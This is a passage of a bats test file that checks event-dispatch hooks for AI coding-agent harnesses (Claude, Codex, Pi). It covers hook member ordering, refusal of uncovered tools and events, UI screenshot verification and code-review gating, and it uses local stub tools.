#!/usr/bin/env bats
# Shared event-dispatch tests. Each lane edits only its BEGIN/END section.

# BEGIN LANE A0 — T70 scaffold
@test "T70: shared test anchors and open-task receipt headings are complete" {
  run python3 -I - "$BATS_TEST_DIRNAME/../.." <<'PY'
from pathlib import Path
import re
import sys

root = Path(sys.argv[1]).resolve()
lanes = [*(f"A{i}" for i in range(5)), *(f"B{i}" for i in range(1, 12)),
         *(f"C{i}" for i in range(5)), "serial-tail"]
files = [root / "native/trellis-hooks/tests/events.rs",
         root / "scripts/tests/hook-event-dispatch.bats",
         *(root / f"scripts/tests/release-store-part{i}.bats" for i in range(1, 6))]
for path in files:
    text = path.read_text()
    for lane in lanes:
        positions = []
        for boundary in ("BEGIN", "END"):
            marker = rf"^(?://|#) {boundary} LANE {lane}(?: — [^\n]+)?$"
            matches = list(re.finditer(marker, text, re.M))
            assert len(matches) == 1, (path, lane, boundary)
            positions.append(matches[0].start())
        assert positions[0] < positions[1], (path, lane)
tasks = (root / "specs/074-fast-hooks/tasks.md").read_text()
receipts = (root / "specs/074-fast-hooks/evidence/mutation-receipts.md").read_text()
for task in re.findall(r"^- \[ \] \*\*(T\d+[ab]?) —", tasks, re.M):
    assert len(re.findall(rf"^## {task} —", receipts, re.M)) == 1, task
PY
  [ "$status" -eq 0 ] || { echo "$output"; false; }
}
# END LANE A0 — T70 scaffold

# BEGIN LANE A1
# The candidate binary, built from this checkout unless TRELLIS_A1_TEST_BIN
# names one. Every test that runs it builds first (incremental), so no test
# depends on another having run: a fresh recorded clone starts with no target.
a1_binary() {
  A1_BIN="${TRELLIS_A1_TEST_BIN:-${CARGO_TARGET_DIR:-$BATS_TEST_DIRNAME/../../native/trellis-hooks/target}/debug/trellis-hooks}"
  if [ -z "${TRELLIS_A1_TEST_BIN:-}" ]; then
    run cargo +1.97.1 build --locked --offline --manifest-path "$BATS_TEST_DIRNAME/../../native/trellis-hooks/Cargo.toml"
    [ "$status" -eq 0 ] || { echo "candidate build failed: $output"; return 1; }
  fi
  [ -x "$A1_BIN" ] || { echo "missing $A1_BIN"; return 1; }
}

@test "A1: candidate event member plan is ordered and explicitly legacy-backed" {
  a1_binary || return 1
  local binary="$A1_BIN"
  run "$binary" event-members pi post_action edit
  [ "$status" -eq 0 ] || { echo "$output"; false; }
  printf '%s' "$output" | python3 -I -c '
import json,sys
p=json.load(sys.stdin)
assert p["candidate_only"] is True
assert [m["name"] for m in p["members"]] == ["post-edit-verify", "slop-tripwire", "track-read", "wiki-skill-suggest"]
assert all(m["backend"] == "legacy" for m in p["members"])
assert p["members"][2]["condition"] == "unless_in_process_read_tracking"
'
}

@test "A1: unknown member plans and unported event routes never allow" {
  a1_binary || return 1
  local binary="$A1_BIN"
  run "$binary" event-members codex PreToolUse Skill
  [ "$status" -ne 0 ]
  run "$binary" event-members pi agent_before_settle
  [ "$status" -eq 0 ]
  printf '%s' "$output" | python3 -I -c '
import json,sys
p=json.load(sys.stdin)
assert [m["name"] for m in p["members"]] == ["spec-gate", "decision-receipt", "stop-verify", "code-review-subagent", "ui-verify", "required-post-action", "stamp-turn"]
assert p["members"][-1]["condition"] == "after_acceptance"
'
  # T20b/T34: pi reaches native through the post_action and
  # agent_before_settle envelopes and the T34 lifecycle phases; a malformed
  # envelope refuses, and every other pi event (pre_action stays in the TS
  # extension) is refused outright.
  run bash -c 'printf "{}" | "$1" event pi post_action /nonexistent' bash "$binary"
  [ "$status" -eq 2 ]
  [[ "$output" == *"post_action batch is not exactly one closed response; refusing"* ]]
  run bash -c 'printf "{}" | "$1" event pi agent_before_settle /nonexistent' bash "$binary"
  [ "$status" -eq 2 ]
  [[ "$output" == *"agent_before_settle batch is not exactly one closed response; refusing"* ]]
  run bash -c 'printf "{}" | "$1" event pi pre_action /nonexistent' bash "$binary"
  [ "$status" -eq 12 ]
  [[ "$output" == *"unknown harness"* ]]
}
# END LANE A1

# BEGIN LANE A2
# END LANE A2

# BEGIN LANE A3
# END LANE A3

# BEGIN LANE A4
# END LANE A4

# BEGIN LANE B1
# END LANE B1

# BEGIN LANE B2
# END LANE B2

# BEGIN LANE B3
# END LANE B3

# BEGIN LANE B4
# END LANE B4

# BEGIN LANE B5
@test "B5 T51/T20b: native PR filtering, proven recorder exec and advisory" {
  run cargo test --locked --offline \
    --manifest-path "$BATS_TEST_DIRNAME/../../native/trellis-hooks/Cargo.toml" \
    --test events b5::
  [ "$status" -eq 0 ] || { echo "$output"; false; }
  [[ "$output" == *"14 passed; 0 failed; 0 ignored"* ]]
}
# END LANE B5

# BEGIN LANE B6
@test "B6 T50: parsed native post results preserve read credit and state identity" {
  run cargo test --locked --offline \
    --manifest-path "$BATS_TEST_DIRNAME/../../native/trellis-hooks/Cargo.toml" \
    --test events b6::tracker
  [ "$status" -eq 0 ] || { echo "$output"; false; }
  [[ "$output" == *"4 passed; 0 failed"* ]]
}

@test "B6 round 2: proof-bound linked-worktree and tracker identity regressions" {
  run cargo test --locked --offline \
    --manifest-path "$BATS_TEST_DIRNAME/../../native/trellis-hooks/Cargo.toml" \
    --test events b6::review_
  [ "$status" -eq 0 ] || { echo "$output"; false; }
  [[ "$output" == *"7 passed; 0 failed"* ]]
}
# END LANE B6

# BEGIN LANE B7
# END LANE B7

# BEGIN LANE B8
# END LANE B8

# BEGIN LANE B9
@test "T30: candidate Stop member plans preserve Codex context membership and order" {
  local binary harness
  a1_binary || return 1
  binary="$A1_BIN"
  for harness in claude codex; do
    run "$binary" event-members "$harness" Stop
    [ "$status" -eq 0 ] || { echo "$harness: $output"; return 1; }
    printf '%s' "$output" | python3 -I -c '
import json,sys
h=sys.argv[1]
p=json.load(sys.stdin)
# T14 amended (owner 2026-11-10): the attachment checks verdict gates Stop first.
expected=["attach-verdict","spec-gate"] + (["save-context-log"] if h == "codex" else []) + ["decision-receipt","stop-verify","code-review-subagent","ui-verify","stamp-turn"]
assert p["candidate_only"] is True
assert [m["name"] for m in p["members"]] == expected
assert p["members"][-1]["condition"] == "always"
' "$harness" || { echo "$harness: incorrect Stop plan: $output"; return 1; }
  done
}

@test "T30: non-routed Stop coordinator preserves verdicts and finalization" {
  run cargo +1.97.1 test --locked --offline \
    --manifest-path "$BATS_TEST_DIRNAME/../../native/trellis-hooks/Cargo.toml" \
    --test events b9_baseline::t30:: -- --test-threads=1
  [ "$status" -eq 0 ] || { echo "$output"; return 1; }
  [[ "$output" == *'test result: ok.'* && "$output" == *'0 failed'* ]]
}
# END LANE B9

# BEGIN LANE C1 T40
# T40: complete event membership, native payload coverage and unknown-coverage
# refusal, matched to the T34/T34b inventory (reports/150/lean-core.md).
t40_binary() {
  a1_binary || return 1
  T40_BIN="$A1_BIN"
}

@test "T40: every native registration in the production templates resolves to its inventory members" {
  t40_binary
  run python3 -I - "$T40_BIN" "$BATS_TEST_DIRNAME/../../core-rules/templates" <<'PY'
import json, subprocess, sys
binary, templates = sys.argv[1:]
WRITE = ["post-edit-verify", "slop-tripwire", "track-read", "wiki-skill-suggest"]
# T14 amended (owner 2026-11-10): attach-verdict gates Stop first.
STOP = ["attach-verdict", "spec-gate", "decision-receipt", "stop-verify", "code-review-subagent", "ui-verify", "stamp-turn"]
expected = {
  ("claude", "PreToolUse", "Bash"): ["block-destructive", "pr-gate-shiftleft"],
  ("claude", "PreToolUse", "Skill"): ["skill-preload-guard"],
  ("claude", "PreToolUse", "Edit"): ["reread-guard"], ("claude", "PreToolUse", "MultiEdit"): ["reread-guard"],
  ("claude", "PreToolUse", "Write"): ["reread-guard"],
  ("claude", "UserPromptExpansion", None): ["skill-slash-guard"],
  ("claude", "UserPromptSubmit", None): ["turn-baseline"],
  ("claude", "PostToolUse", "Read"): ["track-read"], ("claude", "PostToolUse", "Bash"): ["hookspath-guard"],
  ("claude", "PostToolUse", "Write"): WRITE, ("claude", "PostToolUse", "Edit"): WRITE, ("claude", "PostToolUse", "MultiEdit"): WRITE,
  ("claude", "PreCompact", None): ["save-context-log"],
  ("claude", "Stop", None): STOP,
  ("claude", "WorktreeCreate", None): ["trellis-worktree-create"], ("claude", "WorktreeRemove", None): ["trellis-worktree-remove"],
  ("codex", "PreToolUse", "Bash"): ["block-destructive", "pr-gate-shiftleft"],
  ("codex", "PreToolUse", "Edit"): ["reread-guard"], ("codex", "PreToolUse", "MultiEdit"): ["reread-guard"],
  ("codex", "PreToolUse", "Write"): ["reread-guard"],
  ("codex", "UserPromptSubmit", None): ["turn-baseline"],
  ("codex", "PostToolUse", "Read"): ["track-read"], ("codex", "PostToolUse", "Bash"): ["hookspath-guard"],
  ("codex", "PostToolUse", "Write"): WRITE, ("codex", "PostToolUse", "Edit"): WRITE, ("codex", "PostToolUse", "MultiEdit"): WRITE,
  ("codex", "Stop", None): ["attach-verdict", "spec-gate", "save-context-log"] + STOP[2:],
}
seen = set()
for name in ("claude-settings.local.json", "codex-hooks.local.json", "claude-user-settings.json"):
    doc = json.load(open(f"{templates}/{name}"))
    for event, groups in doc["hooks"].items():
        for group in groups:
            for hook in group["hooks"]:
                if hook.get("command") != "__TRELLIS_LAUNCHER__":
                    continue
                harness = hook["args"][2]
                assert hook["args"] == ["hook", "event", harness, event], hook
                matcher = group.get("matcher")
                tools = [None] if matcher in (None, ".*") else matcher.split("|")
                for tool in tools:
                    key = (harness, event, tool)
                    assert key in expected, f"registered but not in the inventory: {key}"
                    out = subprocess.run([binary, "event-members", harness, event] + ([tool] if tool else []), capture_output=True, text=True)
                    assert out.returncode == 0, (key, out.stderr)
                    got = [m["name"] for m in json.loads(out.stdout)["members"]]
                    assert got == expected[key], (key, got)
                    seen.add(key)
missing = sorted(set(expected) - seen, key=str)
assert not missing, f"inventory rows with no registration: {missing}"
print(f"{len(seen)} registered (harness, event, tool) rows match the inventory")
PY
  [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "T40: native-only aliases and Pi routes have their inventory members" {
  t40_binary
  local row expected got
  while IFS='|' read -r row expected; do
    run bash -c '"$1" event-members $2' _ "$T40_BIN" "$row"
    [ "$status" -eq 0 ] || { echo "$row: $output"; return 1; }
    got="$(printf '%s' "$output" | jq -c '[.members[].name]')"
    [ "$got" = "$expected" ] || { echo "$row: $got, want $expected"; return 1; }
  done <<'ROWS'
codex PreToolUse apply_patch|["reread-guard"]
codex PostToolUse apply_patch|["post-edit-verify","slop-tripwire","track-read","wiki-skill-suggest"]
pi post_action file_mutation|["post-edit-verify","slop-tripwire","track-read","wiki-skill-suggest"]
pi post_action file_read|["track-read"]
pi post_action shell|[]
pi agent_before_settle|["spec-gate","decision-receipt","stop-verify","code-review-subagent","ui-verify","required-post-action","stamp-turn"]
pi session_start|["session-context","inject-primer-index"]
pi session_compact|["task-context"]
pi agent_settled|["spec-gate","decision-receipt","primer-capture-nudge","ui-verify"]
pi session_shutdown|[]
ROWS
}

@test "T40: a Codex-native apply_patch payload is covered, while unknown tools and unregistered events refuse" {
  t40_binary
  local home
  home="$(mktemp -d "$BATS_TEST_TMPDIR/home.XXXXXX")" && chmod 700 "$home" && home="$(cd "$home" && pwd -P)"
  t40_event() { printf '%s' "$3" | env -i HOME="$home" TRELLIS_HOME="$home" PATH=/usr/bin:/bin "$T40_BIN" event "$1" "$2" "$BATS_TEST_TMPDIR" 2>/dev/null; }
  # Covered: the refusal is the unproven call, never a coverage gap.
  run t40_event codex PreToolUse '{"tool_name":"apply_patch","tool_input":{"input":"*** Begin Patch\n*** Add File: a.ts\n+x\n*** End Patch\n"}}'
  [[ "$output" != *"no native coverage"* && "$output" == *refusing* ]] || { echo "$output"; return 1; }
  # Unknown tools and unregistered events refuse; nothing is ever allowed.
  run t40_event claude PreToolUse '{"tool_name":"NotebookEdit","tool_input":{}}'
  [ "$status" -eq 11 ] && [[ "$output" == *'"permissionDecision":"deny"'* && "$output" == *"no native coverage for tool NotebookEdit"* ]] || { echo "$status $output"; return 1; }
  for row in 'claude SubagentStop' 'claude SessionEnd' 'claude Notification' 'codex PreCompact' 'codex UserPromptExpansion'; do
    run t40_event ${row} '{}'
    [[ "$output" == *"no native coverage for event"* && "$output" == *'"decision":"block"'* ]] || { echo "$row: $status $output"; return 1; }
  done
  run t40_event pi pre_action '{}'
  [ "$status" -eq 12 ] && [[ "$output" == *"unknown harness"* ]]
}
# END LANE C1 T40

# BEGIN LANE B10
bats_require_minimum_version 1.5.0

b10_ui_fixture() {
  B10_ROOT="$BATS_TEST_DIRNAME/../.."
  B10_PROJECT="$BATS_TEST_TMPDIR/ui-project"
  B10_TOOLS="$BATS_TEST_TMPDIR/ui-tools"
  mkdir -p "$B10_PROJECT" "$B10_TOOLS"
  git -C "$B10_PROJECT" init -q
  printf '%s\n' 'export const View = () => null;' > "$B10_PROJECT/view.tsx"
  git -C "$B10_PROJECT" add view.tsx
  git -C "$B10_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm init
  printf '%s\n' '// changed' >> "$B10_PROJECT/view.tsx"
  printf '%s\n' '#!/bin/sh' 'exit 0' > "$B10_TOOLS/curl"
  printf '%s\n' '#!/bin/sh' \
    'if [ "${1:-}" = "$B10_UI_CORE" ]; then printf "nested bash\\n" >> "$B10_UI_TRACE"; fi' \
    'exec /bin/bash "$@"' > "$B10_TOOLS/bash"
  chmod +x "$B10_TOOLS/curl" "$B10_TOOLS/bash"
}

b10_deploy_ui() {
  local harness="$1" source
  B10_HOOK_DIR="$BATS_TEST_TMPDIR/$harness/hooks"
  mkdir -p "$B10_HOOK_DIR/lib"
  if [ "$harness" = claude ]; then
    source="$B10_ROOT/core-rules/hooks"
  else
    source="$B10_ROOT/core-rules/codex/hooks"
  fi
  cp "$source/ui-verify.sh" "$B10_HOOK_DIR/ui-verify.sh"
  cp "$source/lib/deps.sh" "$B10_HOOK_DIR/lib/deps.sh"
  cp "$B10_ROOT/core-rules/hooks/lib/ui-verify-core.sh" "$B10_HOOK_DIR/lib/ui-verify-core.sh"
}

b10_run_ui() {
  local input="$1"
  run --separate-stderr env PATH="$B10_TOOLS:$PATH" \
    CLAUDE_PROJECT_DIR="$B10_PROJECT" CODEX_PROJECT_DIR="$B10_PROJECT" \
    TRELLIS_ROOT= TRELLIS_HARNESS=codex UI_SHOT_CMD="${B10_SHOT_CMD:-/usr/bin/true}" UI_VERIFY_TIMEOUT=2 \
    B10_UI_CORE="$B10_HOOK_DIR/lib/ui-verify-core.sh" B10_UI_TRACE="$B10_TRACE" \
    /bin/bash "$B10_HOOK_DIR/ui-verify.sh" <<< "$input"
  [ -z "$stderr" ] || { echo "unexpected UI core stderr: $stderr"; return 1; }
}

@test "B10 UI: both wrappers keep a real block without starting a nested bash core" {
  b10_ui_fixture
  local harness expected
  for harness in claude codex; do
    b10_deploy_ui "$harness"
    B10_TRACE="$BATS_TEST_TMPDIR/$harness.bash-trace"
    b10_run_ui '{"stop_hook_active":false}' || return 1
    if [ "$harness" = claude ]; then expected=2; else expected=0; fi
    [ "$status" -eq "$expected" ] || { echo "$harness status $status: $output / $stderr"; return 1; }
    printf '%s' "$output" | jq -e '.decision == "block" and (.reason | contains("screenshot produced no artifact"))' >/dev/null || return 1
    [ -d "$B10_PROJECT/.claude/screenshots" ] || return 1
    [ ! -e "$B10_TRACE" ] || { echo "$harness started a separate bash core"; return 1; }
  done
}

@test "B10 UI: both wrappers keep screenshot artifacts and harness-specific advice" {
  b10_ui_fixture
  printf '%s\n' '#!/bin/sh' 'printf captured > "$2"' > "$B10_TOOLS/shot"
  chmod +x "$B10_TOOLS/shot"
  B10_SHOT_CMD="$B10_TOOLS/shot"
  local harness context shot
  for harness in claude codex; do
    b10_deploy_ui "$harness"
    B10_TRACE="$BATS_TEST_TMPDIR/$harness.pass-trace"
    b10_run_ui '{"stop_hook_active":false}' || return 1
    [ "$status" -eq 0 ] || return 1
    if [ "$harness" = claude ]; then
      context=$(printf '%s' "$output" | jq -er '.additionalContext') || return 1
    else
      context=$(printf '%s' "$output" | jq -er '.systemMessage') || return 1
    fi
    case "$context" in 'ui-verify: screenshot saved to '*) ;; *) return 1 ;; esac
    shot=${context#ui-verify: screenshot saved to }
    [ -s "$shot" ] || return 1
    grep -qx captured "$shot" || return 1
    [ ! -e "$B10_TRACE" ] || return 1
  done
}

@test "B10 UI: reentrant Stop does not block even if the core is missing" {
  b10_ui_fixture
  local harness
  for harness in claude codex; do
    b10_deploy_ui "$harness"
    mv "$B10_HOOK_DIR/lib/ui-verify-core.sh" "$B10_HOOK_DIR/lib/missing-core"
    B10_TRACE="$BATS_TEST_TMPDIR/$harness.reentrant-trace"
    b10_run_ui '{"stop_hook_active":true}' || return 1
    [ "$status" -eq 0 ] || return 1
    [ -z "$output" ] || return 1
    [ ! -e "$B10_TRACE" ] || return 1
  done
}

@test "B10 UI: failed cores retain a block document but empty failures stay open" {
  b10_ui_fixture
  local harness expected
  for harness in claude codex; do
    b10_deploy_ui "$harness"
    B10_TRACE="$BATS_TEST_TMPDIR/$harness.failure-trace"
    printf '%s\n' \
      'ui_verify_decision() { printf "core block noise\\n" >&2; printf "%s\\n" '\''{"verdict":"block","reason":"critical UI failure","artifacts":[]}'\''; return 7; }' \
      'if [ "${BASH_SOURCE[0]}" = "$0" ]; then ui_verify_decision "$@"; fi' \
      > "$B10_HOOK_DIR/lib/ui-verify-core.sh"
    b10_run_ui '{"stop_hook_active":false}' || return 1
    if [ "$harness" = claude ]; then expected=2; else expected=0; fi
    [ "$status" -eq "$expected" ] || return 1
    printf '%s' "$output" | jq -e '.decision == "block" and (.reason | contains("critical UI failure"))' >/dev/null || return 1
    printf '%s\n' 'ui_verify_decision() { return 7; }' \
      'if [ "${BASH_SOURCE[0]}" = "$0" ]; then ui_verify_decision "$@"; fi' \
      > "$B10_HOOK_DIR/lib/ui-verify-core.sh"
    b10_run_ui '{"stop_hook_active":false}' || return 1
    [ "$status" -eq 0 ] || return 1
    [ -z "$output" ] || return 1
  done
}

@test "B10 UI: sourced core has null stdin, quiet stderr and executable-mode flags" {
  b10_ui_fixture
  local harness context
  for harness in claude codex; do
    b10_deploy_ui "$harness"
    B10_TRACE="$BATS_TEST_TMPDIR/$harness.source-contract-trace"
    cat > "$B10_HOOK_DIR/lib/ui-verify-core.sh" <<'CORE'
ui_verify_decision() {
  local reason="isolated source contract"
  if [ "${BASH_SOURCE[0]}" = "$0" ]; then
    reason="core executed in a second Bash"
  elif [ ! /dev/fd/0 -ef /dev/null ]; then
    reason="core stdin is not /dev/null"
  else
    case "$-" in
      *e*u*|*u*e*) ;;
      *) reason="core executable-mode flags missing" ;;
    esac
    [[ -o pipefail ]] || reason="core executable-mode flags missing"
  fi
  printf '%s\n' 'core noise must not become a Claude block reason' >&2
  printf '{"verdict":"advisory","reason":"%s","artifacts":[]}\n' "$reason"
}
if [ "${BASH_SOURCE[0]}" = "$0" ]; then ui_verify_decision "$@"; fi
CORE
    b10_run_ui '{"stop_hook_active":false}' || return 1
    [ "$status" -eq 0 ] || return 1
    if [ "$harness" = claude ]; then
      context=$(printf '%s' "$output" | jq -er '.additionalContext') || return 1
    else
      context=$(printf '%s' "$output" | jq -er '.systemMessage') || return 1
    fi
    [ "$context" = 'isolated source contract' ] || { echo "$harness: $context"; return 1; }
    [ ! -e "$B10_TRACE" ] || return 1
  done
}

@test "B10 UI: a missing core blocks for each harness" {
  b10_ui_fixture
  local harness expected
  for harness in claude codex; do
    b10_deploy_ui "$harness"
    mv "$B10_HOOK_DIR/lib/ui-verify-core.sh" "$B10_HOOK_DIR/lib/missing-core"
    B10_TRACE="$BATS_TEST_TMPDIR/$harness.missing-trace"
    b10_run_ui '{"stop_hook_active":false}' || return 1
    if [ "$harness" = claude ]; then expected=2; else expected=0; fi
    [ "$status" -eq "$expected" ] || return 1
    printf '%s' "$output" | jq -e '.decision == "block" and (.reason | contains("core library missing"))' >/dev/null || return 1
    [ ! -e "$B10_TRACE" ] || return 1
  done
}
# D2 checkpoint tests. Recovery instruction: author first, do not execute until
# the apex grants a test window. All reviewers below are deterministic stubs.
b10_d2_fixture() {
  local harness="$1" source tag="${2:-}"
  B10_D2_ROOT="$BATS_TEST_DIRNAME/../.."
  B10_D2_PROJECT="$BATS_TEST_TMPDIR/d2-$harness$tag-project"
  B10_D2_TOOLS="$BATS_TEST_TMPDIR/d2-$harness$tag-tools"
  B10_D2_HOOKS="$BATS_TEST_TMPDIR/d2-$harness$tag-hooks"
  B10_D2_STATE="$BATS_TEST_TMPDIR/d2-$harness$tag-state"
  mkdir -p "$B10_D2_PROJECT" "$B10_D2_TOOLS" "$B10_D2_HOOKS/lib" "$B10_D2_STATE"
  git -C "$B10_D2_PROJECT" init -q
  git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm init --allow-empty
  local f
  for f in alpha beta gamma; do
    printf 'def %s():\n    return 1\n' "$f" > "$B10_D2_PROJECT/$f.py"
  done
  if [ "$harness" = claude ]; then source=hooks; else source=codex/hooks; fi
  cp "$B10_D2_ROOT/core-rules/$source/code-review-subagent.sh" "$B10_D2_HOOKS/code-review-subagent.sh"
  cp "$B10_D2_ROOT/core-rules/$source/lib/deps.sh" "$B10_D2_HOOKS/lib/deps.sh"
  cp "$B10_D2_ROOT/core-rules/$source/lib/autonomy.sh" "$B10_D2_HOOKS/lib/autonomy.sh"
  cp "$B10_D2_ROOT/core-rules/hooks/lib/code-reviewer.sh" "$B10_D2_HOOKS/lib/code-reviewer.sh"
  cp "$B10_D2_ROOT/scripts/lib/trellis-python.sh" "$B10_D2_HOOKS/lib/trellis-python.sh"
  B10_D2_REAL_GIT=$(command -v git)
  B10_D2_REAL_WC=$(command -v wc)
  B10_D2_REAL_PYTHON=$(command -v python3)
  B10_D2_REAL_JQ=$(command -v jq)
  cat > "$B10_D2_TOOLS/git" <<'SH'
#!/bin/bash
case " $* " in
  *' --no-index '*|*' hash-object '*) printf '%s\n' "$*" >> "$B10_D2_STATE/render-trace" ;;
esac
if [ "${1:-}" = diff ]; then
  case " $* " in
    *' --numstat '*|*' --name-only '*) ;;
    *) printf '%s\n' "$*" >> "$B10_D2_STATE/render-trace" ;;
  esac
fi
case "${1:-}" in
  add) printf '%s\n' "$*" >> "$B10_D2_STATE/content-trace" ;;
esac
exec "$B10_D2_REAL_GIT" "$@"
SH
  cat > "$B10_D2_TOOLS/wc" <<'SH'
#!/bin/bash
# Metadata-only spy: identify a protected input fd without reading its bytes.
"$B10_D2_REAL_PYTHON" -I -c 'import os,sys
try:
    a=os.fstat(0); b=os.stat(os.environ["B10_D2_PROTECTED"])
    if (a.st_dev,a.st_ino)==(b.st_dev,b.st_ino):
        with open(os.environ["B10_D2_STATE"]+"/protected-read", "a") as f: f.write("wc input read\n")
except (KeyError,FileNotFoundError): pass'
exec "$B10_D2_REAL_WC" "$@"
SH
  cat > "$B10_D2_TOOLS/reviewer" <<'SH'
#!/bin/bash
printf 'call\n' >> "$B10_D2_STATE/calls"
cat > "$B10_D2_STATE/payload"
printf '%s\n' '{"status":"completed","findings":[]}'
SH
  chmod +x "$B10_D2_TOOLS/git" "$B10_D2_TOOLS/wc" "$B10_D2_TOOLS/reviewer"
}

b10_d2_review() {
  local input="${1:-}"
  [ -n "$input" ] || input='{}'
  run --separate-stderr env PATH="$B10_D2_TOOLS:$PATH" \
    CLAUDE_PROJECT_DIR="$B10_D2_PROJECT" CODEX_PROJECT_DIR="$B10_D2_PROJECT" \
    TRELLIS_HOME="$B10_D2_STATE/home" TRELLIS_ROOT= TRELLIS_HARNESS=codex \
    CODE_REVIEWER_CMD="$B10_D2_TOOLS/reviewer" \
    B10_D2_REAL_GIT="$B10_D2_REAL_GIT" B10_D2_REAL_WC="$B10_D2_REAL_WC" \
    B10_D2_REAL_PYTHON="$B10_D2_REAL_PYTHON" B10_D2_REAL_JQ="$B10_D2_REAL_JQ" \
    B10_D2_STATE="$B10_D2_STATE" B10_D2_PROTECTED="${B10_D2_PROTECTED:-/nonexistent}" \
    "${B10_TEST_BASH:-/bin/bash}" "$B10_D2_HOOKS/code-review-subagent.sh" <<< "$input"
}

b10_d2_no_completion() {
  local marker
  marker=$(find "$B10_D2_PROJECT" -name '.review-done-*' -print -quit)
  [ -z "$marker" ] || return 1
  marker=$(find "$B10_D2_STATE" -name 'reviewed.*' -print -quit)
  [ -z "$marker" ] || return 1
}

@test "B10 T27 R1: only Boolean true suppresses the review on either shell twin" {
  local harness input
  unset TRELLIS_REVIEW_IN_PROGRESS TRELLIS_REVIEW_OVERRIDE
  for harness in claude codex; do
    b10_d2_fixture "$harness" -strict-reentry
    cat > "$B10_D2_TOOLS/reviewer" <<'STRICT_REVIEW'
#!/bin/bash
printf 'call\n' >> "$B10_D2_STATE/calls"
cat >/dev/null
printf '%s\n' '{"status":"completed","findings":[{"severity":"critical","file":"alpha.py","msg":"must run review"}]}'
STRICT_REVIEW
    b10_d2_review '{"stop_hook_active":true}'
    [ "$status" -eq 0 ]
    [ -z "$output" ]
    [ ! -e "$B10_D2_STATE/calls" ]
    for input in '{"stop_hook_active":"true"}' '{"stop_hook_active":"true\u0000\n"}'; do
      b10_d2_review "$input"
      if [ "$harness" = claude ]; then [ "$status" -eq 2 ]; else [ "$status" -eq 0 ]; fi
      printf '%s' "$output" | jq -e '.decision == "block" and (.reason | contains("must run review"))' >/dev/null
      b10_d2_no_completion
    done
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 2 ]
  done
}

@test "B10 D2 M4: metadata and stream use the trusted resolver, never PATH or inherited Python" {
  local harness
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    printf '%s\n' '#!/bin/sh' 'printf called >> "$B10_D2_STATE/python-shim-called"' 'exit 99' > "$B10_D2_TOOLS/python3"
    chmod +x "$B10_D2_TOOLS/python3"
    TRELLIS_PYTHON="$B10_D2_TOOLS/python3" TRELLIS_PYTHON_CANDIDATES="$B10_D2_TOOLS/python3" b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [ -s "$B10_D2_STATE/calls" ] || return 1
    [ ! -e "$B10_D2_STATE/python-shim-called" ] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
    jq -e '.diff | contains("alpha.py")' "$B10_D2_STATE/payload" >/dev/null || return 1
  done
}

@test "B10 D2: over-cap untracked content is budgeted before reading and never reviewed twice" {
  local harness first_notice
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    B10_D2_PROTECTED="$B10_D2_PROJECT/oversized.py"
    python3 -I -c 'import pathlib,sys; pathlib.Path(sys.argv[1]).write_bytes(b"x = 1\n" * 40000)' "$B10_D2_PROTECTED"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    first_notice="$output$stderr"
    [[ "$first_notice" == *UNREVIEWED* ]] || return 1
    [[ "$first_notice" == *commit*split*exclude* ]] || return 1
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [ ! -e "$B10_D2_STATE/calls" ] || return 1
    [ ! -e "$B10_D2_STATE/protected-read" ] || return 1
    [ ! -e "$B10_D2_STATE/content-trace" ] || return 1
    [ ! -e "$B10_D2_STATE/render-trace" ] || return 1
    printf '%s' "$output" | jq -se 'length == 1 and (.[0] | (.additionalContext // .systemMessage) | contains("UNREVIEWED"))' >/dev/null || return 1
    [[ "$stderr" == *UNREVIEWED*notice*suppressed* ]] || return 1
    b10_d2_no_completion || return 1
    find "$B10_D2_STATE" -name 'unmet.capture.*' -type f -print -quit | grep -q . || return 1
  done
}

@test "B10 D2: over-cap tracked diff makes zero reviewer calls on consecutive Stops" {
  local harness first_notice
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    python3 -I -c 'import pathlib,sys; pathlib.Path(sys.argv[1]).write_bytes(b"line = 1\n" * 30000)' "$B10_D2_PROJECT/tracked.py"
    git -C "$B10_D2_PROJECT" add tracked.py
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    first_notice="$output$stderr"
    [[ "$first_notice" == *UNREVIEWED* ]] || return 1
    [[ "$first_notice" == *commit*split*exclude* ]] || return 1
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [ ! -e "$B10_D2_STATE/calls" ] || return 1
    printf '%s' "$output" | jq -se 'length == 1 and (.[0] | (.additionalContext // .systemMessage) | contains("UNREVIEWED"))' >/dev/null || return 1
    [[ "$stderr" == *UNREVIEWED*notice*suppressed* ]] || return 1
    b10_d2_no_completion || return 1
  done
}

@test "B10 D2: even an under-cap announced binary exclusion cannot yield completed" {
  local harness
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    printf '\000opaque' > "$B10_D2_PROJECT/small.bin"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [[ "$output$stderr" == *UNREVIEWED*small.bin* ]] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
    jq -e '.excluded_paths | index("small.bin") != null' "$B10_D2_STATE/payload" >/dev/null || return 1
    jq -e '.diff | contains("alpha.py") and (contains("small.bin") | not)' "$B10_D2_STATE/payload" >/dev/null || return 1
    b10_d2_no_completion || return 1
  done
}

@test "B10 D2: huge binary is excluded without a content read or completed marker" {
  local harness
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    B10_D2_PROTECTED="$B10_D2_PROJECT/archive.bin"
    # Sparse fixture: large logical bytes, negligible disk use.
    python3 -I -c 'import sys; f=open(sys.argv[1],"wb"); f.truncate(64000000); f.close()' "$B10_D2_PROTECTED"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [[ "$output$stderr" == *UNREVIEWED* ]] || return 1
    [[ "$output$stderr" == *archive.bin* ]] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
    [ ! -e "$B10_D2_STATE/protected-read" ] || return 1
